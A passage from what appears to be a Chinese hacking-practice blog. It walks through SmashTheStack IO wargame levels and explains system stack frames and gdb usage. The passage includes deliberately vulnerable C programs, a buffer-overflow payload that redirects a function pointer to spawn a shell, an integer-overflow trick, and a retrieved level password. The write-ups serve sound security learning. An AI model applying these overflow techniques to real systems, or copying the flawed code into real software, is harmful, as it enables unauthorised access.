class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//bla, based on work by beach</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">good</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Win.\"</span>);</div><div class=\"line\">    execl(<span class=\"string\">\"/bin/sh\"</span>, <span class=\"string\">\"sh\"</span>, <span class=\"literal\">NULL</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">bad</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"I'm so sorry, you're at %p and you want to be at %p\\n\"</span>, bad, good);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">void</span> (*functionpointer)(<span class=\"keyword\">void</span>) = bad;</div><div class=\"line\">    <span class=\"keyword\">char</span> buffer[<span class=\"number\">50</span>];</div><div class=\"line\">    <span class=\"keyword\">if</span>(argc != <span class=\"number\">2</span> || <span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]) &lt; <span class=\"number\">4</span>)</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">memcpy</span>(buffer, argv[<span class=\"number\">1</span>], <span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]));</div><div class=\"line\">    <span class=\"built_in\">memset</span>(buffer, <span class=\"number\">0</span>, <span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]) - <span class=\"number\">4</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"This is exciting we're going to %p\\n\"</span>, functionpointer);</div><div class=\"line\">    functionpointer();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"②-执行结果\"><a href=\"#②-执行结果\" class=\"headerlink\" title=\"② 执行结果\"></a>② 执行结果</h2><p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1eslav1k4bwj30io027q3r.jpg\" alt=\"\"></p>\n<h2 id=\"③-分析结果\"><a href=\"#③-分析结果\" class=\"headerlink\" title=\"③ 分析结果\"></a>③ 分析结果</h2><p>最终要跳转到good()函数执行，调用 execl(“/bin/sh”, “sh”, NULL);<br>bad()函数的起始地址是0x80484a4，good()函数的起始地址是0x8048474<br>起初functionpointer是指向bad()函数的，需要构造输入，使buffer溢出，修改functionpointer的值</p>\n<h1 id=\"II、函数说明\"><a href=\"#II、函数说明\" class=\"headerlink\" title=\"II、函数说明\"></a>II、函数说明</h1><h2 id=\"①-memcpy\"><a href=\"#①-memcpy\" class=\"headerlink\" title=\"① memcpy()\"></a>① memcpy()</h2><p>【定义函数】void <em>memcpy(void</em>dest, const void *src, size_t n);<br>【函数说明】</p>\n<ol>\n<li>source和destin所指内存区域不能重叠，函数返回指向destin的指针。</li>\n<li>与strcpy相比，memcpy并不是遇到’\\0’就结束，而是一定会拷贝完n个字节。 memcpy用来做内存拷贝，你可以拿它拷贝任何数据类型的对象，可以指定拷贝的数据长度；</li>\n<li>如果目标数组destin本身已有数据，执行memcpy（）后，将覆盖原有数据（最多覆盖n）。如果要追加数据，则每次执行memcpy后，要将目标数组地址增加到你要追加数据的地址。<br>注意，source和destin都不一定是数组，任意的可读写的空间均可。<br>【返回值】函数返回一个指向dest的指针。</li>\n</ol>\n<h2 id=\"②-memset\"><a href=\"#②-memset\" class=\"headerlink\" title=\"② memset()\"></a>② memset()</h2><p>【定义函数】void <em> memset( void </em> ptr, int value, size_t num );<br>【函数说明】<br> memset()会将ptr所指的内存区域的前num个字节的值都设置为value，然后返回指向ptr的指针。<br>memset()可以将一段内存空间全部设置为特定的值，所以经常用来初始化字符数组。<br>【返回值】返回指向 ptr 的指针。</p>\n<h1 id=\"III、找漏洞\"><a href=\"#III、找漏洞\" class=\"headerlink\" title=\"III、找漏洞\"></a>III、找漏洞</h1><h2 id=\"①-栈\"><a href=\"#①-栈\" class=\"headerlink\" title=\"① 栈\"></a>① 栈</h2><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1eslavce0j0j30mc0c6776.jpg\" alt=\"\"><br>ebp:0xbffffc88，esp:0xbffffc10，栈范围：0xbffffc10~0xbffffc88</p>\n<h2 id=\"②-内存\"><a href=\"#②-内存\" class=\"headerlink\" title=\"② 内存\"></a>② 内存</h2><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1eslavkosj2j30nn093jwt.jpg\" alt=\"\"><br>查看functionpointer的地址，分析其和buffer起始地址的距离<br>functionpointer在buffer前定义，先入栈，在高地址，functionpointer（0x80484a4）的地址为0xbffffc7c<br>buffer的起始地址为0xbffffc30，中间隔了76Byte</p>\n<h2 id=\"③-构造输入\"><a href=\"#③-构造输入\" class=\"headerlink\" title=\"③ 构造输入\"></a>③ 构造输入</h2><p>需要先输入67个任意字符，到functionpointer前地址，0x8048474（good()函数起始地址）和0x80484a4（bad()函数起始地址）只有最后一个Byte不同，只用修改最后1Byte值，所以构造的输入：76<em>A+0x74<br>“$(python -c ‘print “A”</em>76 + “t” ‘ )”<br>（t的ascii码值：0x74）</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1eslavpqx9dj30k80350tk.jpg\" alt=\"\"></p>\n"},{"title":"SmashTheStack IO level2","url":"http://huirong.github.io/2015/05/18/smashTheStack-io-level2/","content":"<p>由上一关取得的密码进入本关卡<br><a id=\"more\"></a></p>\n<h1 id=\"I、函数说明\"><a href=\"#I、函数说明\" class=\"headerlink\" title=\"I、函数说明\"></a>I、函数说明</h1><h2 id=\"①-signal\"><a href=\"#①-signal\" class=\"headerlink\" title=\"① signal()\"></a>① signal()</h2><p>【定义函数】void (<em>signal(int signum, void(</em> handler)(int)))(int);<br>【函数说明】signal()会依参数signum 指定的信号编号来设置该信号的处理函数. 当指定的信号到达时就会跳转到参数handler 指定的函数执行. 如果参数handler 不是函数指针, 则必须是下列两个常数之一：</p>\n<ul>\n<li>SIG_IGN 忽略参数signum 指定的信号.</li>\n<li>SIG_DFL 将参数signum 指定的信号重设为核心预设的信号处理方式.<br>eg: signal(SIGINT ,SIG_DFL );<br>SIGINT信号代表由InterruptKey产生，通常是CTRL+C或者是DELETE。发送给所有ForeGroundGroup的进程。 SIG_DFL代表执行系统默认操作，其实对于大多数信号的系统默认动作时终止该进程。</li>\n</ul>\n<h2 id=\"②-SIGFPE\"><a href=\"#②-SIGFPE\" class=\"headerlink\" title=\"② SIGFPE\"></a>② SIGFPE</h2><p> 数学相关的异常，如被0除，浮点溢出，等等</p>\n<h2 id=\"③-atoi\"><a href=\"#③-atoi\" class=\"headerlink\" title=\"③ atoi()\"></a>③ atoi()</h2><p>【定义函数】int atoi (const char * str);<br>【函数说明】atoi()函数会扫描参数str字符串，跳过前面的空白字符（例如空格，tab缩进等，可以通过isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\\0’)才结束转换，并将结果返回。<br>【返回值】返回转换后的整型数；如果str不能转换成int或者str为空字符串，那么将返回 0。</p>\n<h2 id=\"④-abs\"><a href=\"#④-abs\" class=\"headerlink\" title=\"④ abs()\"></a>④ abs()</h2><p>【定义函数】int abs (int j);<br>【函数说明】abs()用来计算参数j 的绝对值，然后将结果返回。<br>【返回值】返回参数j 的绝对值结果。</p>\n<h1 id=\"II、找漏洞\"><a href=\"#II、找漏洞\" class=\"headerlink\" title=\"II、找漏洞\"></a>II、找漏洞</h1><h2 id=\"①-分析源码\"><a href=\"#①-分析源码\" class=\"headerlink\" title=\"① 分析源码\"></a>① 分析源码</h2><p>源代码：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;signal.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">catcher</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    setresuid(geteuid(),geteuid(),geteuid());</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"WIN!\\n\"</span>);</div><div class=\"line\">    system(<span class=\"string\">\"/bin/sh\"</span>);</div><div class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"source code is available in level02.c\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> (argc != <span class=\"number\">3</span> || !atoi(argv[<span class=\"number\">2</span>]))</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">    signal(SIGFPE, catcher);</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">abs</span>(atoi(argv[<span class=\"number\">1</span>])) / atoi(argv[<span class=\"number\">2</span>]);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>源码分析：</p>\n<ul>\n<li>（1）main函数参数：<br>if (argc != 3 || !atoi(argv[2])) 如果不是三个参数或第二个参数为0 函数退出。<br>main函数文件名本身是一个参数，因此在运行时，应该输入两个参数，argc才为3</li>\n<li>（2）signal(SIGFPE, catcher);<br>如果有数字相关的异常产生，调用catcher()函数</li>\n<li>（3）返回 atoi(第一个参数)/atoi(第二个参数)的绝对值</li>\n</ul>\n<h2 id=\"②-查看运行效果\"><a href=\"#②-查看运行效果\" class=\"headerlink\" title=\"② 查看运行效果\"></a>② 查看运行效果</h2><p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1esdajv6jf5j30ed0270t1.jpg\" alt=\"\"><br>没有任何反应</p>\n<h2 id=\"③-找漏洞\"><a href=\"#③-找漏洞\" class=\"headerlink\" title=\"③ 找漏洞\"></a>③ 找漏洞</h2><p>最终目的是调用catcher()函数，执行system(“/bin/sh”);<br>应该产生一个与数字相关的异常，除数为0的情况已经排除在外了，只能想其他办法了。<br>不知大家是否记得整数的表示范围呢，32位操作系统：-2^31~2^31-1<br>绝对值之间差1，bingo，这是漏洞点，最小负数除1，然后取绝对值，溢出了。。。。。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1esdak4gsgtj30hp03mwf5.jpg\" alt=\"\"></p>\n<p>PS：相信大家都看到了，还有个level02_alt.c函数，你也可以找这个函数的漏洞来获取下一关的密码，大家自己试试，我不写博客了。。。。。。</p>\n"},{"title":"SmashTheStack IO level1","url":"http://huirong.github.io/2015/05/18/smashTheStack-io-level1/","content":"<p>现在正式开始练习，进入第一关<br><a id=\"more\"></a></p>\n<h1 id=\"I、进入系统\"><a href=\"#I、进入系统\" class=\"headerlink\" title=\"I、进入系统\"></a>I、进入系统</h1><p>1、在终端输入：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh -l level1 io<span class=\"selector-class\">.smashthestack</span><span class=\"selector-class\">.org</span> -p2224</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1es88zxmuwxj30k305pwfv.jpg\" alt=\"\"></p>\n<p>2、输入密码<br>第一关的密码是level1 （只有第一关的密码才知道，以后每一关的密码需要自己取得）<br>看到以下信息，说明已经进来了，每一关的权限有限，这个可以自己测试一下就知道了。<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1es890ccegkj30k00cvq7i.jpg\" alt=\"\"></p>\n<h1 id=\"II、熟悉环境\"><a href=\"#II、熟悉环境\" class=\"headerlink\" title=\"II、熟悉环境\"></a>II、熟悉环境</h1><h2 id=\"①-首先阅读README文件\"><a href=\"#①-首先阅读README文件\" class=\"headerlink\" title=\"① 首先阅读README文件\"></a>① 首先阅读README文件</h2><p>我是不会给你翻译的，自己慢慢阅读<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1es891dmcsaj30k10220tk.jpg\" alt=\"\"></p>\n<h2 id=\"②-查看levels\"><a href=\"#②-查看levels\" class=\"headerlink\" title=\"② 查看levels\"></a>② 查看levels</h2><p>每一关都有一个可执行文件或对应的C程序，可通过gdb调试可执行文件，所有这些文件存放在 /levels 目录中<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1es891i9mhjj30k00a479u.jpg\" alt=\"\"></p>\n<h1 id=\"III、找漏洞\"><a href=\"#III、找漏洞\" class=\"headerlink\" title=\"III、找漏洞\"></a>III、找漏洞</h1><h2 id=\"①-执行level01\"><a href=\"#①-执行level01\" class=\"headerlink\" title=\"① 执行level01\"></a>① 执行level01</h2><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1es891o9ucfj30k0012t8w.jpg\" alt=\"\"><br>随便输入三个数字，查看效果<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1es891rv5uij30k001hglw.jpg\" alt=\"\"><br>没有任何反应</p>\n<h2 id=\"②-gdb调试\"><a href=\"#②-gdb调试\" class=\"headerlink\" title=\"② gdb调试\"></a>② gdb调试</h2><p>如果不会gdb的，可以查看我的博客：<a href=\"\">GDB常用命令</a>，当然网上也有很多教程<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">gdb</span> level01</div></pre></td></tr></table></figure></p>\n<p>我试过了，不能使用list命令查看源代码，那就老老实实看汇编代码吧<br><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">disassembel main</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1es891xfak8j30k10ak0uc.jpg\" alt=\"\"></p>\n<h2 id=\"③-分析汇编指令\"><a href=\"#③-分析汇编指令\" class=\"headerlink\" title=\"③ 分析汇编指令\"></a>③ 分析汇编指令</h2><p>第一关，应该不会太难的，果真如此，就连我这个汇编菜鸟都能看懂<br>输入一个数，存入eax寄存器；与0x10f进行比较，如果相等，跳转到YouWin，否则退出<br>那么结果显而易见，应该输入0x10f，不过要转化为十进制：271</p>\n<h2 id=\"④-测试\"><a href=\"#④-测试\" class=\"headerlink\" title=\"④ 测试\"></a>④ 测试</h2><p>重新运行level01<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./level01</div></pre></td></tr></table></figure></p>\n<p>输入 271<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1es89254g8dj30k102174y.jpg\" alt=\"\"><br>OK，成功破解第一关，是不是很easy</p>\n<h1 id=\"IV、查看下一关密码\"><a href=\"#IV、查看下一关密码\" class=\"headerlink\" title=\"IV、查看下一关密码\"></a>IV、查看下一关密码</h1><p>按照上面的提示，密码放在/home/level2/.pass 中<br>那还等什么，赶紧查看密码吧！！！！<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">cat /<span class=\"built_in\">home</span>/level2/.pass</div></pre></td></tr></table></figure></p>\n<p>密码get：3ywr07ZFw5IsdKzU<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1es892c8l9wj30jz01imx9.jpg\" alt=\"\"></p>\n<p>由此密码可以顺利进入下一关。。。。。。。</p>\n"},{"title":"Smash the Stack Wargaming Network介绍","url":"http://huirong.github.io/2015/05/18/smashTheStack/","content":"<p>最近在学习缓冲区溢出，听说这个靶练场不错，就去学习学习。。。。。<br><a id=\"more\"></a></p>\n<h1 id=\"I、Smash-the-Stack简介\"><a href=\"#I、Smash-the-Stack简介\" class=\"headerlink\" title=\"I、Smash the Stack简介\"></a>I、Smash the Stack简介</h1><p>Smash the Stack Wargaming Network提供一系列的博弈赛。在本网站中，一场博弈赛相当与一个合法的黑客环境，再现了现实世界中软件漏洞的理论或概念，并允许我们合法的使用渗透测试技术。该网站提到的软件，可以是操作系统、网络协议或任何用户应用程序。</p>\n<h1 id=\"II、如何进入博弈赛\"><a href=\"#II、如何进入博弈赛\" class=\"headerlink\" title=\"II、如何进入博弈赛\"></a>II、如何进入博弈赛</h1><p>为了进入博弈赛，你需要一个ssh客户端（openssh,PuTTy,SecureCRT）。每一关都有其独特的连接细节，你需要注意 <font color=\"orange\">端口</font> 和 <font color=\"orange\">初始用户名</font>。<br>如果你使用Linux系统，只需在终端输入：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">user<span class=\"variable\">@box:</span>$ ssh -l level1 io.smashthestack.org -p2224</div></pre></td></tr></table></figure></p>\n<p> 紧接着就要输入密码，第一关的密码是 level1<br> 这样就可以成功进入第一关</p>\n<h1 id=\"III、如何获得下一关的密码\"><a href=\"#III、如何获得下一关的密码\" class=\"headerlink\" title=\"III、如何获得下一关的密码\"></a>III、如何获得下一关的密码</h1><p> 你只有找到本关卡的漏洞，并成功利用，才能获得下一关的密码。每一关的密码放在不同的位置。但是它位于以下几个位置中的一个：<br>    ~/.pass<br>    ~/passwd<br>    /pass/</p>\n<p>查看密码使用一下命令：<br>user@box:$ cat ~/.pass<br>user@box:$ cat /pass/level1<br>user@box:$ cat ~/passwd</p>\n<p>本文章，我只是个翻译员，不过接下来的关卡，都是自己的亲身实践。。。。。。</p>\n<h1 id=\"IV、参考文献\"><a href=\"#IV、参考文献\" class=\"headerlink\" title=\"IV、参考文献\"></a>IV、参考文献</h1><p><a href=\"http://smashthestack.org/faq.html#a3\" target=\"_blank\" rel=\"external\">Smash the Stack Wargaming Network</a></p>\n"},{"title":"系统栈的工作原理","url":"http://huirong.github.io/2015/05/18/系统栈的工作原理/","content":"<h1 id=\"I、内存的不同用途\"><a href=\"#I、内存的不同用途\" class=\"headerlink\" title=\"I、内存的不同用途\"></a>I、内存的不同用途</h1><p>不管什么样的操作系统、计算机结构， 一个进程使用的内存按照功能大致分为以下4个部分</p>\n<ol>\n<li>代码区：存储着被转入执行的二进制代码，处理器会到这个区域取指并执行</li>\n<li>数据区：用于存储全局变量等</li>\n<li>堆区：进程可以再堆区动态地请求一定大小的内存，并在用完之后归还给栈区。动态分配和回收是堆区的特点</li>\n<li>栈区：用于动态存数函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行</li>\n</ol>\n<p>在windows平台下，高级语言写出的程序经过编译连接后，最终变成PE文件（可执行文件）。当PE文件被装载运行后，就是进程。</p>\n<p>PE文件的机器代码会被载入到内存的代码区，处理器将到内存的 这一区域取指，然后送入到算数逻辑单元执行；如果代码请求开辟动态内存，则会在内存的堆区分配一块大小合适的区域返回给代码区的代码使用；当函数调用发生时，函数的调用关系在等信息会动态地保存在栈区， 以供处理器在执行完函数调用代码时，返回母函数。过程如图<br> <img src=\"https://img.blog.csdn.net/20141011102913578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSGFwcHlIdWlyb25n/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"\"><br>如果把CPU比作一个有条不紊的工厂，我们可以得到如下类比：<br>CPU是完成工作的工人<br>数据区、栈区、堆区是则是存放 原料、成品等的场所<br>存在代码区的指令则告诉CPU做什么，如何做</p>\n<h1 id=\"II、函数调用时，栈的变化\"><a href=\"#II、函数调用时，栈的变化\" class=\"headerlink\" title=\"II、函数调用时，栈的变化\"></a>II、函数调用时，栈的变化</h1><p>通过以下例子研究一下函数调用和递归等性质是如何通过系统栈巧妙实现的</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span>  <span class=\"title\">func_B</span><span class=\"params\">(<span class=\"keyword\">int</span> arg_B1, <span class=\"keyword\">int</span> arg_B2)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">int</span> var_B1, var_B2;</div><div class=\"line\">  var_B1=arg_B1+arg_B2;</div><div class=\"line\">  var_B2=arg_B1-arg_B2;</div><div class=\"line\">  <span class=\"keyword\">return</span> var_B1\\*var_B2;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span>  <span class=\"title\">func_A</span><span class=\"params\">(<span class=\"keyword\">int</span> arg_A1, <span class=\"keyword\">int</span> arg_A2)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">int</span> var_A;</div><div class=\"line\">  var_A = func_B(arg_A1,arg_A2) + arg_A1 ;</div><div class=\"line\">  <span class=\"keyword\">return</span> var_A;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> \\*\\*argv, <span class=\"keyword\">char</span> \\*\\*envp)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">int</span> var_main;</div><div class=\"line\">  var_main=func_A(<span class=\"number\">4</span>,<span class=\"number\">3</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> var_main;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>经过编译后，各函数对用的机器指令在代码区的分布如左下，不同的函数可能相邻，可能不相邻。<br>当CPU执行调用fun_A 函数时，会从代码区中main函数对应的机器指令的区域跳转到fun_A 对应的机器指令区域，在那里取指并执行；当fun_A 返回时，又回到main的机器指令区域，条用fun_A后面的指令继续执行main函数的代码，CPU的执行轨迹如右下：</p>\n<p><img src=\"https://img.blog.csdn.net/20141011104654009?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSGFwcHlIdWlyb25n/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"\">                     <img src=\"https://img.blog.csdn.net/20141011104702184?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSGFwcHlIdWlyb25n/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"\"></p>\n<p>在函数调用的过程中，伴随的系统栈的操作如下<br><img src=\"https://img.blog.csdn.net/20141011105750677?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvSGFwcHlIdWlyb25n/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"\"></p>\n<ol>\n<li>在main函数调用fun_A的时候，首先在自己的栈中压入函数返回地址，然后为fun_A创建新栈帧压入系统栈。</li>\n<li>在fun_A调用fun_B的时候，同样自己的栈中压入函数返回地址，然后为fun_B创建新栈帧压入系统栈。</li>\n<li>在fun_B返回时，fun_B的栈帧被弹出系统栈，fun_B栈中的返回地址被“露”在栈顶，此时CPU按照这个返回地址回到fun_a的代码区执行。</li>\n<li>在fun_A返回时，fun_A的栈帧被弹出系统栈，main栈中的返回地址被“露”在栈顶，此时CPU按照这个返回地址回到main的代码区执行。</li>\n</ol>\n<h1 id=\"III、函数调用步骤\"><a href=\"#III、函数调用步骤\" class=\"headerlink\" title=\"III、函数调用步骤\"></a>III、函数调用步骤</h1><ol>\n<li>参数入栈：参数从右到左的入栈</li>\n<li>返回地址入栈</li>\n<li>代码区跳转</li>\n<li>栈顶调整</li>\n</ol>\n<p>调用时用到的指令序列如下</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ;调用前</div><div class=\"line\">push 参数<span class=\"number\">3</span>    ; 假设该函数有<span class=\"number\">3</span>个参数，将从右向左依次入栈</div><div class=\"line\">push 参数<span class=\"number\">2</span>    </div><div class=\"line\">push 参数<span class=\"number\">1</span>    </div><div class=\"line\">call 函数地址  ; call指令将同时完成两项工作：a）向栈中压入当前指令在内存中的位置，          ; 即保存返回地址；b）跳转到所调用函数的入口地址</div><div class=\"line\"></div><div class=\"line\">  ;函数入口处</div><div class=\"line\">push ebp      ; 保存旧栈帧的底部</div><div class=\"line\">mov ebp，esp    ; 设置新栈帧的底部（栈帧切换）</div><div class=\"line\">sub esp，xxx    ; 设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）</div></pre></td></tr></table></figure>\n<p><img src=\"https://img.blog.csdn.net/20141011111650821\" alt=\"\"></p>\n<p><img src=\"https://img.blog.csdn.net/20141011111441312\" alt=\"\"></p>\n"},{"title":"gdb和insight debugger调试带参数程序","url":"http://huirong.github.io/2015/05/17/debugWithArgs/","content":"<p>gdb –args ./testprg arg1 arg2<br><a id=\"more\"></a><br>另一种方式：<br>正常启动  gdb testprg<br>带参数运行 run arg1 arg2</p>\n<p>insight是gdb的图形化界面，基本命令都一样<br>insight –args ./testprg arg1 arg2</p>\n"},{"title":"Linux 下安装 Insight Debugger","url":"http://huirong.github.io/2015/05/15/InstallTheInsightDebugger/","content":"<p>之前一直在用gdb调试器，查看内存、寄存器的值都觉得不方便，Insight Debugger相当与图形化的gdb<br><a id=\"more\"></a></p>\n<h1 id=\"I、添加源\"><a href=\"#I、添加源\" class=\"headerlink\" title=\"I、添加源\"></a>I、添加源</h1><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1es4yacbwwrj30i301u74j.jpg\" alt=\"\"><br>在 /etc/apt/sources.list 中添加源：<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">deb <span class=\"symbol\">http:</span>/<span class=\"regexp\">/ppa.launchpad.net/sevenmachines</span><span class=\"regexp\">/dev/ubuntu</span> natty main </div><div class=\"line\">deb-src <span class=\"symbol\">http:</span>/<span class=\"regexp\">/ppa.launchpad.net/sevenmachines</span><span class=\"regexp\">/dev/ubuntu</span> natty main</div></pre></td></tr></table></figure></p>\n<p>更新源<br><figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> <span 